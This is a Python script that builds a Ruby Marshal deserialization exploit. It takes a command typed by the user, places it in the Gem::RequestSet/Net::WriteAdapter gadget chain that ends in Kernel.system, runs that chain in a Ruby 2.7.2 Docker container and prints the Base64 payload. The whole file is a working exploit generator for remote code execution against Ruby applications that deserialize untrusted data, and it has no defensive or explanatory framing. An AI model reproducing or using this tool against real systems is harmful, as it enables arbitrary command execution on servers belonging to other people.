import subprocess
import os

# Console output colors
GREEN = "\033[92m"
WHITE = "\033[97m"
RESET = "\033[0m"
ORANGE = "\033[38;5;214m"  
RED = "\033[91m"           


def get_payload():
    # Ask user for the custom command
    print()
    user_input = input("Enter the command to be executed: ").strip()

    # Write the Ruby script with the custom payload injected
    ruby_script = f"""
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "{user_input}")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.strict_encode64(payload)
"""
    # Write the Ruby script to a temporary file
    with open("borrar.rb", "w") as f:
        f.write(ruby_script)

    # Execute the Ruby script using Docker
    result = subprocess.run(['docker', 'run', '--rm', '-v', f'{subprocess.os.getcwd()}/borrar.rb:/app/borrar.rb', 'ruby:2.7.2', 'bash', '-c', 'ruby /app/borrar.rb'], capture_output=True, text=True)

    # Print the output (base64 serialized object)
    if result.returncode == 0:
        print("\nGenerated Payload (Base64):\n")
        print(result.stdout.strip())  # Remove leading/trailing whitespace
    else:
        print("\nError executing Ruby script:\n")
        print(result.stderr)

    # Remove the file after execution
    try:
        os.remove("borrar.rb")
        #print("\nborrar.rb has been deleted.")
    except Exception as e:
        print(f"\nError deleting borrar.rb: {e}")

# Run the function to get the payload
get_payload()
